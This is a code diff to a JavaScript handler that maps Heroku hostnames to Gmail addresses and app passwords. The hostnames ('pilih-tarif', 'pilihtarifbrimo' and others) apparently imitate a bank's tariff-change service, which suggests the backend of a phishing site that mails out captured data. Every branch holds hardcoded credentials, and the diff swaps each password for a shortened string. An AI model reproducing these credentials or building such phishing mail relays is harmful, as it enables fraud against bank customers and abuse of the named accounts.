@@ -10,25 +10,25 @@ export default function handler(req, res) {
     if (url == 'pilih-tarif.herokuapp.com'){
 
        email = 'itupasti76@gmail.com'
-       pass = 'wbnsrwboqqufuwxa'
+       pass = 'wbnboqqufuwxa'
     }else
     
     if (url == 'pilih-tarifbrii-new.herokuapp.com'){
 
        email = 'asakakor89@gmail.com'
-       pass = 'vqstifbghycnzyrg'
+       pass = 'vqstifbcnzyrg'
     }else
     
     if(url == 'pilihtarifbrimo.herokuapp.com') //jika url sama dengan url hosting
     {
 
         email = 'sehebat52@gmail.com'; //email
-        pass = 'xkzebfcpoaqurrsw'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'xkzebfcpoaqsw'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if(url == 'pilihperubahantarif.herokuapp.com') //jika url sama dengan url hosting
     {
         email = 'sinetronsilala@gmail.com'; //email
-        pass = 'xqlshlibfcvtzepl'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'xqlshlibfzepl'; //sandi aplikasi dari verifikasi 2 langkah
     }
     else {
 
